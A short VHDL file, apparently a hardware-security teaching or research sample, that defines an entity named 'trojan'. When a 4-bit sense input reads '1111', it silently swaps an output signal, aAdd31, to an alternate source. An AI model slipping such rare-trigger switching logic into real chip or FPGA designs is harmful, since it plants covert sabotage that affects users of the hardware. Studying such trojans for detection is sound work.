----------------------------------------------------------------------------------
-- Company: 
-- Engineer: 
-- 
-- Create Date:    17:54:30 02/12/2017 
-- Design Name: 
-- Module Name:    tr1 - Behavioral 
-- Project Name: 
-- Target Devices: 
-- Tool versions: 
-- Description: 
--
-- Dependencies: 
--
-- Revision: 
-- Revision 0.01 - File Created
-- Additional Comments: 
--
----------------------------------------------------------------------------------
library IEEE;
use IEEE.STD_LOGIC_1164.ALL;

-- Uncomment the following library declaration if using
-- arithmetic functions with Signed or Unsigned values
--use IEEE.NUMERIC_STD.ALL;

-- Uncomment the following library declaration if instantiating
-- any Xilinx primitives in this code.
--library UNISIM;
--use UNISIM.VComponents.all;

entity trojan is
    Port ( sense : in  STD_LOGIC_VECTOR (3 downto 0);
           aStp3 : in  STD_LOGIC;
           aStp30 : in  STD_LOGIC;
           aAdd31 : out  STD_LOGIC);
end trojan;

architecture Behavioral of trojan is

begin

process (sense, aStp3, aStp30)
begin
if (sense = "1111" ) then
aAdd31 <= aStp3;
else
aAdd31 <= aStp30;
end if;

end process;

end Behavioral;

